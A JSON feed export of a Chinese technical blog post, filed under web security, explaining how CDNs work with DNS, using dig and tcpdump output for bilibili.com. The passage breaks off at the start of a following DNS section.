{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"web安全\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/11/27/CDN/",
            "url": "http://example.com/2022/11/27/CDN/",
            "title": "CDN&DNS",
            "date_published": "2022-11-27T05:38:45.000Z",
            "content_html": "<h1 id=\"cdn\"><a class=\"markdownIt-Anchor\" href=\"#cdn\">#</a> CDN</h1>\n<h2 id=\"0x00-cdn概述\"><a class=\"markdownIt-Anchor\" href=\"#0x00-cdn概述\">#</a> 0x00 CDN 概述</h2>\n<p><strong>CDN</strong> 英文全称 <code>Content Delivery Network</code> ，中文翻译即为<strong>内容分发网络</strong>。它是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。</p>\n<p>CDN 这个技术其实说起来并不复杂，最初的核心理念，就是<strong>将内容缓存在终端用户附近</strong>。</p>\n<p>具体来说，CDN 就是采用更多的缓存服务器（CDN 边缘节点），布放在用户访问相对集中的地区或网络中。当用户访问网站时，利用全局负载技术，将用户的访问指向距离最近的缓存服务器上，由缓存服务器响应用户请求。</p>\n<p>镜像服务器是源内容服务器的完整复制。而 CDN，是部分内容的缓存，智能程度更高。</p>\n<p><strong>CDN = 更智能的镜像 + 缓存 + 流量导流</strong>。</p>\n<h2 id=\"0x01-cdn应用场景\"><a class=\"markdownIt-Anchor\" href=\"#0x01-cdn应用场景\">#</a> <strong>0x01 CDN 应用场景</strong></h2>\n<h6 id=\"1-网站站点应用加速\"><a class=\"markdownIt-Anchor\" href=\"#1-网站站点应用加速\">#</a> <strong>1、网站站点 / 应用加速</strong></h6>\n<p>站点或者应用中大量静态资源的加速分发，建议将站点内容进行动静分离，动态文件可以结合云服务器 ECS，静态资源如各类型图片、html、css、js 文件等，建议结合 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9wcm9kdWN0L2Nvcz9mcm9tPTEwNjgw\">对象存储</span> OSS 存储海量静态资源，可以有效加速内容加载速度，轻松搞定网站图片、短视频等内容分发。</p>\n<h6 id=\"2-视音频点播大文件下载分发加速\"><a class=\"markdownIt-Anchor\" href=\"#2-视音频点播大文件下载分发加速\">#</a> <strong>2、视音频点播 / 大文件下载分发加速</strong></h6>\n<p>支持各类文件的下载、分发，支持在线点播加速业务，如 mp4、flv 视频文件或者平均单个文件大小在 20M 以上，主要的业务场景是视音频点播、大文件下载（如安装包下载）等，建议搭配对象存储 OSS 使用，可提升回源速度，节约近 2/3 回源带宽成本。</p>\n<h6 id=\"3-视频直播加速\"><a class=\"markdownIt-Anchor\" href=\"#3-视频直播加速\">#</a> <strong>3、视频直播加速</strong></h6>\n<p>视频流媒体直播服务，支持媒资存储、切片转码、访问鉴权、内容分发加速一体化解决方案。结合弹性伸缩服务，及时调整服务器带宽，应对突发访问流量；结合媒体转码服务，享受高速稳定的并行转码，且任务规模无缝扩展。</p>\n<h6 id=\"4-移动应用加速\"><a class=\"markdownIt-Anchor\" href=\"#4-移动应用加速\">#</a> <strong>4、移动应用加速</strong></h6>\n<p>移动 APP 更新文件（apk 文件）分发，移动 APP 内图片、页面、短视频、UGC 等内容的优化加速分发。提供 httpDNS 服务，避免 DNS 劫持并获得实时精确的 DNS 解析结果，有效缩短用户访问时间，提升用户体验。</p>\n<h2 id=\"0x01-cdn网络的组成\"><a class=\"markdownIt-Anchor\" href=\"#0x01-cdn网络的组成\">#</a> 0x01 CDN 网络的组成</h2>\n<p>一个 CDN 网络主要由以下几部分组成：内容缓存设备、内容分发管理设备、本地负载均衡交换机、GSLB 设备和 CDN 管理系统，其网络结构如下图所示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20130609113946968\" alt=\"img\"></p>\n<p><strong>内容缓存设备 Cache</strong>：</p>\n<p>用于缓存内容实体和对缓存内容进行组织和管理。当有用户访问该客户内容时，直接由各缓存服务器响应用户的请求。</p>\n<p><strong>内容分发管理设备</strong>：</p>\n<p>主要负责核心 Web 服务器内容到 CDN 网络内缓存设备的内容推送、删除、校验以及内容的管理、同步。</p>\n<p><strong>GSLB 设备</strong>：</p>\n<p>则实现 CDN 全网各缓存节点之间的资源负载均衡，它与各节点的 SLB 设备保持通信，搜集各节点缓存设备的健康状态、性能、负载等，自动将用户指引到位于<strong>其地理区域中的最近服务器</strong>或者引导用户<strong>离开拥挤的网络和服务器</strong>。还可以通过使用多站点的内容和服务来提高容错性和可用性，防止因本地网或区域网络中断、断电或自然灾害而导致的故障。</p>\n<blockquote>\n<p>不用 CDN 技术时，使用 GSLB 设备可以为用户选择最合适的服务器，但受 Web 服务器的负荷和传输距离等因素的影响，响应速度依然经常不能满足用户的需求。这一问题的解决方案就是在传输网络上利用缓存技术使得 Web 服务数据流能够就近访问。内容分发网络（CDN）正是这种思想的一个实现，CDN 使用 GSLB 设备将用户引导到最合适的缓存节点（距离近，负载低），使得用户在访问静态内容时获得更好的体验。</p>\n</blockquote>\n<p><strong>CDN 管理系统</strong>：</p>\n<p>实现对全网设备的管理，对系统的配置。它不仅能对系统中的各个设备进行实时监控，对各种故障产生相应的告警，还能实时观测到系统中总的流量以及各节点的流量，并保存在系统的数据库中，作为统计分析的基础数据，并对日志文件进行管理、报告，作为计费的基础数据。</p>\n<h2 id=\"0x02-cdn-原理\"><a class=\"markdownIt-Anchor\" href=\"#0x02-cdn-原理\">#</a> 0x02 CDN 原理</h2>\n<h3 id=\"cdn-解析流程\"><a class=\"markdownIt-Anchor\" href=\"#cdn-解析流程\">#</a> CDN 解析流程</h3>\n<p>如果某个用户想要访问优酷的视频点播内容，那么：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125204154043.png\" alt=\"image-20221125204154043\" style=\"zoom:67%;\" />\n<blockquote>\n<p>①、当用户点击 APP 上的内容，APP 会根据 URL 地址去<strong>本地 DNS</strong>（域名解析系统）寻求 IP 地址解析。</p>\n<p>②、当用户点击网站页面上的内容 URL，经过本地 DNS 系统解析，DNS 系统会最终将域名的解析权交给 CNAME 指向的 CDN 专用 DNS 服务器。</p>\n<p>③、CDN 专用 DNS 服务器，将 CDN 的全局负载均衡设备 IP 地址返回用户。也就是上面所说的 GSLB 设备</p>\n<p>④、用户向<strong> CDN 的负载均衡设备</strong>发起内容 URL 访问请求。</p>\n<p>⑤、CDN 负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的<strong>缓存服务器</strong>。</p>\n<p>⑥、负载均衡设备告诉用户这台缓存服务器的 IP 地址，让用户向所选择的缓存服务器发起请求。</p>\n<p>⑦、用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。</p>\n<p>⑧、如果这台缓存服务器上并没有用户想要的内容，那么这台缓存服务器就要网站的<strong>源服务器</strong>请求内容。</p>\n<p>⑨、源服务器返回内容给缓存服务器，缓存服务器发给用户，并根据用户自定义的缓存策略，判断要不要把内容缓存到缓存服务器上。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/u6pjybbkxn.png\" alt=\"img\"></p>\n<blockquote>\n<ol>\n<li>当终端用户（北京）向 <code>www.a.com</code>  下的指定资源发起请求时，首先向 LDNS（本地 DNS）发起域名解析请求。</li>\n<li>LDNS 检查缓存中是否有 <code>www.a.com</code>  的 IP 地址记录。如果有，则直接返回给终端用户；如果没有，则向授权 DNS 查询。</li>\n<li>当授权 DNS 解析 <code>www.a.com</code>  时，返回域名 CNAME www.a.tbcdn.com 对应 IP 地址。</li>\n<li>域名解析请求发送至阿里云 DNS 调度系统，并为请求分配最佳节点 IP 地址。</li>\n<li>LDNS 获取 DNS 返回的解析 IP 地址。</li>\n<li>用户获取解析 IP 地址。</li>\n<li>用户向获取的 IP 地址发起对该资源的访问请求。</li>\n</ol>\n<ul>\n<li>如果该 IP 地址对应的节点已缓存该资源，则会将数据直接返回给用户，例如，图中步骤 7 和 8，请求结束。</li>\n<li>如果该 IP 地址对应的节点未缓存该资源，则节点向源站发起对该资源的请求。获取资源后，结合用户自定义配置的缓存策略，将资源缓存至节点，例如，图中的北京节点，并返回给用户，请求结束。</li>\n</ul>\n</blockquote>\n<blockquote>\n<ol>\n<li>CDN 的加速资源是跟域名绑定的。</li>\n<li>通过域名访问资源，首先是通过 DNS 分查找离用户最近的 CDN 节点（边缘服务器）的 IP</li>\n<li>通过 IP 访问实际资源时，如果 CDN 上并没有缓存资源，则会到源站请求资源，并缓存到 CDN 节点上，这样，用户下一次访问时，该 CDN 节点就会有对应资源的缓存了。</li>\n</ol>\n</blockquote>\n<p>应用 CDN 后，DNS 返回的不再是 IP 地址，而是一个 CNAME (Canonical Name) 别名记录，指向 CDN 的全局负载均衡 GSLB, GSLB 实际上在域名解析的过程中承担了中间人（或者说代理）的角色，这是 CDN 实现的关键</p>\n<p>CDN 主要功能是在不同的地点缓存内容，通过负载均衡技术，将用户的请求定向到最合适的缓存服务器上去获取内容，比如说，是北京的用户，我们让他访问北京的节点，深圳的用户，我们让他访问深圳的节点。通过就近访问，加速用户对网站的访问。解决 Internet 网络拥堵状况，提高用户访问网络的响应速度。</p>\n<p>由于没有返回 IP 地址，于是本地 DNS 会向负载均衡系统再发送请求 ，则进入到 CDN 的全局负载均衡系统 GSLB 进行智能调度：</p>\n<ul>\n<li>看用户的 IP 地址，查表得知地理位置，找相对最近的边缘节点</li>\n<li>看用户所在的运营商网络，找相同网络的边缘节点</li>\n<li>检查边缘节点的负载情况，找负载较轻的节点</li>\n<li>其他，比如节点的 “健康状况”、服务能力、带宽、响应时间等</li>\n</ul>\n<p>结合上面的因素，得到最合适的边缘节点，然后把这个节点返回给用户，用户就能够就近访问 CDN 的缓存代理</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/fdde5787e61870ee5d997f1ca89d0870.png\" alt=\"img\"></p>\n<p>我们可以用 dig 查看 dns 解析结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# dig www.bilibili.com</span><br><span class=\"line\"></span><br><span class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.7 &lt;&lt;&gt;&gt; www.bilibili.com</span><br><span class=\"line\">;; global options: +cmd</span><br><span class=\"line\">;; Got answer:</span><br><span class=\"line\">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 60626</span><br><span class=\"line\">;; flags: qr rd ra; QUERY: 1, ANSWER: 22, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class=\"line\"></span><br><span class=\"line\">;; QUESTION SECTION:</span><br><span class=\"line\">;www.bilibili.com.\t\tIN\tA</span><br><span class=\"line\"></span><br><span class=\"line\">;; ANSWER SECTION:</span><br><span class=\"line\">www.bilibili.com.\t144\tIN\tCNAME\ta.w.bilicdn1.com.</span><br><span class=\"line\">a.w.bilicdn1.com.\t169\tIN\tCNAME\tct.w.bilicdn1.com.</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.27</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.28</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.29</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.30</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t183.131.147.48</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.42</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.21.179.18</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.44</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.45</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.46</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t116.207.137.66</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t116.207.137.67</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t116.207.137.68</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t61.147.236.43</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.21.179.19</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.21.179.20</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.23.60.12</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.23.60.13</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.23.60.14</span><br><span class=\"line\">ct.w.bilicdn1.com.\t60\tIN\tA\t117.23.60.15</span><br><span class=\"line\"></span><br><span class=\"line\">;; Query time: 7 msec</span><br><span class=\"line\">;; SERVER: 183.60.83.19#53(183.60.83.19)</span><br><span class=\"line\">;; WHEN: Fri Nov 25 21:22:04 CST 2022</span><br><span class=\"line\">;; MSG SIZE  rcvd: 398</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在ANSWER SECTION列表可以看出</span><br><span class=\"line\"></span><br><span class=\"line\">www.bilibili.com为cname记录指向a.w.bilicdn1.com.</span><br><span class=\"line\">a.w.bilicdn1.com为cname记录指向ct.w.bilicdn1.com.</span><br><span class=\"line\">ct.w.bilicdn1.com.返回了20条A记录，这20个ip 信息是</span><br><span class=\"line\">中国浙江金华 电信</span><br><span class=\"line\">中国江苏南通 电信</span><br><span class=\"line\">中国湖北宜昌 电信 </span><br><span class=\"line\">中国 陕西省 西安市 电信  -- 117.23.60.14</span><br><span class=\"line\">比如我在陕西省西安市鄠邑区，可以看出返回的都是就近节点。实际上CDN是有非常多的边缘节点。</span><br></pre></td></tr></table></figure>\n<p>用 tcpdump 来监控下 DNS 的 UDP 数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# tcpdump -n -s 1500 udp and port 53</span><br><span class=\"line\">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class=\"line\">listening on eth0, link-type EN10MB (Ethernet), capture size 1500 bytes</span><br><span class=\"line\">21:28:21.393765 IP 10.0.16.11.45832 &gt; 183.60.83.19.domain: 32323+ A? www.bilibili.com. (34)</span><br><span class=\"line\"></span><br><span class=\"line\">21:28:21.394724 IP 183.60.83.19.domain &gt; 10.0.16.11.45832: 32323 22/0/0 CNAME a.w.bilicdn1.com., CNAME ct.w.bilicdn1.com., A 61.147.236.42, A 61.147.236.43, A 61.147.236.44, A 61.147.236.45, A 61.147.236.46, A 116.207.137.66, A 116.207.137.67, A 116.207.137.68, A 117.21.179.18, A 117.21.179.19, A 117.21.179.20, A 117.23.60.12, A 171.214.10.140, A 171.214.10.141, A 171.214.10.142, A 183.131.147.27, A 183.131.147.28, A 183.131.147.29, A 183.131.147.30, A 183.131.147.48 (398)</span><br><span class=\"line\"></span><br><span class=\"line\">21:28:21.407290 IP 10.0.16.11.32999 &gt; 183.60.83.19.domain: 53397+ PTR? 42.236.147.61.in-addr.arpa. (44)</span><br><span class=\"line\"></span><br><span class=\"line\">21:28:21.431995 IP 183.60.83.19.domain &gt; 10.0.16.11.32999: 53397 NXDomain 0/1/0 (93)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>其中，10.0.16.11 为腾讯云服务器内网地址。也就是本机向路由器询问 DNS 解析，如果路由器已经缓存了，就会直接返回。</p>\n<h3 id=\"传统的网站访问与cdn访问\"><a class=\"markdownIt-Anchor\" href=\"#传统的网站访问与cdn访问\">#</a> 传统的网站访问与 CDN 访问</h3>\n<p><strong>传统访问访问：</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/n630r4cz49.png\" alt=\"img\"></p>\n<p><strong>使用了 CDN 的网站访问：</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/7qb88zlcll.png\" alt=\"img\"></p>\n<p>在没有 CDN 的情况下，用户向浏览器输入 <code>www.web.com</code>  这个域名，客户端访问本地 DNS 服务器的时候，如果本地 DNS 服务器有缓存，则返回网站的地址；如果没有，递归查询到网站的权威 DNS 服务器，这个权威 DNS 服务器是负责 web.com 的，它会返回网站的 IP 地址。</p>\n<p>本地 DNS 服务器缓存下 IP 地址，将 IP 地址返回，然后客户端直接访问这个 IP 地址，就访问到了这个网站。</p>\n<p><strong>然而有了 CDN 之后，情况发生了变化</strong>。</p>\n<p>在 web.com 这个权威 DNS 服务器上，会设置一个 CNAME 别名，指向另外一个域名 <code>www.web.cdn.com</code> ，返回给本地 DNS 服务器。</p>\n<p>当本地 DNS 服务器拿到这个新的域名时，需要继续解析这个新的域名。这个时候，再访问的就不是 <span class=\"exturl\" data-url=\"aHR0cDovL3dlYi5jb20=\">web.com</span> 的权威 DNS 服务器了，而是 web.cdn.com 的权威 DNS 服务器，这是 CDN 自己的权威 DNS 服务器。在这个服务器上，还是会设置一个 CNAME，指向另外一个域名，也即 CDN 网络的全局负载均衡器。</p>\n<p>接下来，<strong>本地 DNS 服务器去请求 CDN 的全局负载均衡器解析域名</strong>，全局负载均衡器会为用户选择一台合适的缓存服务器提供服务</p>\n<p>基于以上这些条件，进行综合分析之后，全局负载均衡器会返回一台缓存服务器的 IP 地址。</p>\n<p>本地 DNS 服务器缓存这个 IP 地址，然后将 IP 返回给客户端，客户端去访问这个边缘节点，下载资源。 缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200418104105733.png\" alt=\"在这里插入图片描述\"></p>\n<p>与传统访问方式不同，<strong>CDN 网络则是在用户和服务器之间增加缓存层，将用户的访问请求引导到最优的缓存节点</strong>而不是服务器源站点，从而加速访问速度。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/ciawk92i4h.png\" alt=\"img\"></p>\n<h3 id=\"缓存代理\"><a class=\"markdownIt-Anchor\" href=\"#缓存代理\">#</a> 缓存代理</h3>\n<p>缓存系统是 CDN 的另一个关键组成部分，缓存系统会有选择地缓存那些最常用的那些资源</p>\n<p>其中有两个衡量 CDN 服务质量的指标：</p>\n<ul>\n<li>回源率：缓存里没有，必须用代理的方式回源站取，回源次数与所有访问次数之比</li>\n</ul>\n<blockquote>\n<p>缓存系统也可以划分出层次，分成一级缓存节点和二级缓存节点。一级缓存配置高一些，直连源站，二级缓存配置低一些，直连用户<br>\n回源的时候二级缓存只找一级缓存，一级缓存没有才回源站，可以有效地减少真正的回源</p>\n</blockquote>\n<ul>\n<li>命中率：用户访问的资源恰好在缓存系统里，可以直接返回给用户，命中次数与所有访问次数之比</li>\n</ul>\n<blockquote>\n<p>现在的商业 CDN 命中率都在 90% 以上，相当于把源站的服务能力放大了 10 倍以上</p>\n</blockquote>\n<h2 id=\"0x03-cdn好处\"><a class=\"markdownIt-Anchor\" href=\"#0x03-cdn好处\">#</a> 0x03 CDN 好处</h2>\n<blockquote>\n<h6 id=\"1-为了实现跨运营商-跨地域的全网覆盖\"><a class=\"markdownIt-Anchor\" href=\"#1-为了实现跨运营商-跨地域的全网覆盖\">#</a> <strong>1. 为了实现跨运营商、跨地域的全网覆盖</strong></h6>\n<p>互联不互通、区域 ISP 地域局限、出口带宽受限制等种种因素都造成了网站的区域性无法访问。CDN 加速可以覆盖全球的线路，通过和运营商合作，部署 IDC 资源，在全国骨干节点商，合理部署 CDN 边缘分发存储节点，充分利用带宽资源，平衡源站流量。</p>\n<p>例如中国移动手机用户访问中国电信网络的内容源，可以通过在中国移动假设 CDN 服务器，进行加速。效果是非常明显的。</p>\n<h6 id=\"2-为了保障你的网站安全\"><a class=\"markdownIt-Anchor\" href=\"#2-为了保障你的网站安全\">#</a> <strong>2. 为了保障你的网站安全</strong></h6>\n<p>CDN 的负载均衡和分布式存储技术，可以加强网站的可靠性，相当无无形中给你的网站添加了一把保护伞，应对绝大部分的互联网攻击事件。防攻击系统也能避免网站遭到恶意攻击。</p>\n<p>内容进行分发后，源服务器的 IP 被隐藏，受到攻击的概率会大幅下降。CDN 可以通过分流 ，洗掉来自 Ddos 大部分的攻击 。</p>\n<h6 id=\"3-为了异地备援\"><a class=\"markdownIt-Anchor\" href=\"#3-为了异地备援\">#</a> <strong>3. 为了异地备援</strong></h6>\n<p>当某个服务器发生意外故障时，系统将会调用其他临近的健康服务器节点进行服务，进而提供接近 100% 的可靠性，这就让你的网站可以做到永不宕机。</p>\n<h6 id=\"4-为了节约成本投入\"><a class=\"markdownIt-Anchor\" href=\"#4-为了节约成本投入\">#</a> <strong>4. 为了节约成本投入</strong></h6>\n<p>使用 CDN 加速可以实现网站的全国铺设，你根据不用考虑购买服务器与后续的托管<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9zb2x1dGlvbi9vcGVyYXRpb24/ZnJvbT0xMDY4MA==\">运维</span>，服务器之间镜像同步，也不用为了管理维护技术人员而烦恼，节省了人力、精力和财力。</p>\n<h6 id=\"5-为了让你更专注业务本身\"><a class=\"markdownIt-Anchor\" href=\"#5-为了让你更专注业务本身\">#</a> <strong>5. 为了让你更专注业务本身</strong></h6>\n<p>CDN 加速厂商一般都会提供一站式服务，业务不仅限于 CDN，还有配套的云存储、大数据服务、视频云服务等，而且一般会提供 7x24 运维监控支持，保证网络随时畅通，你可以放心使用。并且将更多的精力投入到发展自身的核心业务之上。</p>\n<p>6. 互联网服务提供商采用 CDN，是<strong>以存储换时延</strong>。通信运营商也追捧 CDN，但它们的目的，是<strong>以存储换带宽</strong> —— 通过服务 “下沉”，减轻上层骨干网络的流量压力，避免硬件扩容，降低网络建设成本。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125204403468.png\" alt=\"image-20221125204403468\"></p>\n<h2 id=\"0x04-常用的cdn缓存软件\"><a class=\"markdownIt-Anchor\" href=\"#0x04-常用的cdn缓存软件\">#</a> 0x04 常用的 CDN 缓存软件</h2>\n<blockquote>\n<ul>\n<li>Varnish ：可以认为是内存缓存，速度一流，但是内存缓存也限制了其容量，缓存页面和图片一般是挺好的；</li>\n<li>squid 是功能最全面的比较传统的 web cache server，有自己的存储引擎。，但是架构太老，性能不怎样。</li>\n<li>nginx 本来是反向代理 /web 服务器，用了插件可以做做这个副业，但是本身不支持的功能比较多</li>\n</ul>\n</blockquote>\n<h2 id=\"0x05-cdn相关术语\"><a class=\"markdownIt-Anchor\" href=\"#0x05-cdn相关术语\">#</a> 0x05 CDN 相关术语</h2>\n<p><strong>CDN 相关的术语解释</strong></p>\n<h6 id=\"1-origin-server源站\"><a class=\"markdownIt-Anchor\" href=\"#1-origin-server源站\">#</a> <strong>1、Origin Server 源站</strong></h6>\n<p>做 CDN 之前的客户真正的服务器。</p>\n<h6 id=\"2-user\"><a class=\"markdownIt-Anchor\" href=\"#2-user\">#</a> <strong>2、User</strong></h6>\n<p>访问者，也就是要访问网站的网民。</p>\n<h6 id=\"3-last-mile\"><a class=\"markdownIt-Anchor\" href=\"#3-last-mile\">#</a> <strong>3、Last Mile</strong></h6>\n<p>最后一公里，也就是网民到他所访问到的 CDN 服务器之间的路径。</p>\n<h6 id=\"4-域名\"><a class=\"markdownIt-Anchor\" href=\"#4-域名\">#</a> <strong>4、域名</strong></h6>\n<p>域名是 Internet 网络上的一个服务器或一个网络系统的名字，全世界，没有重复的域名。</p>\n<h6 id=\"5-cname记录\"><a class=\"markdownIt-Anchor\" href=\"#5-cname记录\">#</a> <strong>5、CNAME 记录</strong></h6>\n<p>它是一个别名记录 (Canonical Name)；当 DNS 系统在查询 CNAME 左面的名称的时候，都会转向 CNAME 右面的名称再进行查询，一直追踪到最后的 PTR 或 A 名称，成功查询后才会做出回应，否则失败。</p>\n<h6 id=\"6-cname域名\"><a class=\"markdownIt-Anchor\" href=\"#6-cname域名\">#</a> <strong>6、CNAME 域名</strong></h6>\n<p>CDN 的域名加速需要用到 CNAME 记录，在服务器控制台配置完成 CDN 加速后，您会得到一个加速后的域名，称之为 CNAME 域名（该域名一定是 <code>*.*http://wljslmz.com</code> ）， 用户需要将自己的域名作 CNAME 指向这个 <code>*.*http://wljslmz.com</code>  的域名后，域名解析的工作就正式转向云服务器，该域名所有的请求都将转向云 CDN 的节点。</p>\n<h6 id=\"7-dns\"><a class=\"markdownIt-Anchor\" href=\"#7-dns\">#</a> <strong>7、DNS</strong></h6>\n<p>DNS 即 Domain Name System，是域名解析服务的意思。它在互联网的作用是：把域名转换成为网络可以识别的 ip 地址。人们习惯记忆域名，但机器间互相只认 IP 地址，域名与 IP 地址之间是一一对应的，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，整个过程是自动进行的。比如：上网时输入的百度一下，你就知道会自动转换成为 <code>220.181.112.143</code></p>\n<h6 id=\"8-边缘节点\"><a class=\"markdownIt-Anchor\" href=\"#8-边缘节点\">#</a> <strong>8、边缘节点</strong></h6>\n<p>也称 CDN 节点、Cache 节点等；是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用 cache 设备上，以此来提高网站访问的速度和质量。</p>\n<h6 id=\"9-cache\"><a class=\"markdownIt-Anchor\" href=\"#9-cache\">#</a> <strong>9、cache</strong></h6>\n<p>cache 高速缓冲存储器一种特殊的存储器子系统，其中复制了频繁使用的数据以利于快速访问。存储器的高速缓冲存储器存储了频繁访问的 RAM 位置的内容及这些数据项的存储地址。当处理器引用存储器中的某地址时，高速缓冲存储器便检查是否存有该地址。如果存有该地址，则将数据返回处理器；如果没有保存该地址，则进行常规的存储器访问。因为高速缓冲存储器总是比主 RAM 存储器速度快，所以当 RAM 的访问速度低于微处理器的速度时，常使用高速缓冲存储器。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzc5MzM1\">什么是 CDN？它解决了什么难题？5 分钟让你明明白白！ - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODk0MDQ1MQ==\">也许是史上最全的一次 CDN 详解 - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81MjM2Mjk1MA==\">到底什么是 CDN？ - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82OTYyOTA0MjE2NTAzMzIwNTg5\">一图秒懂 CDN 原理 - 掘金 (juejin.cn)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3JhenltYWtlcmNpcmNsZS9wLzE0OTc4NTEzLmh0bWwjYXV0b2lkLWgyLTAtMC0w\">CDN 图解（秒懂 + 史上最全） - 疯狂创客圈 - 博客园 (cnblogs.com)</span></p>\n<p>来都来了，看个 DNS 再走吧～</p>\n<h1 id=\"dns\"><a class=\"markdownIt-Anchor\" href=\"#dns\">#</a> DNS</h1>\n<h2 id=\"dns概述\"><a class=\"markdownIt-Anchor\" 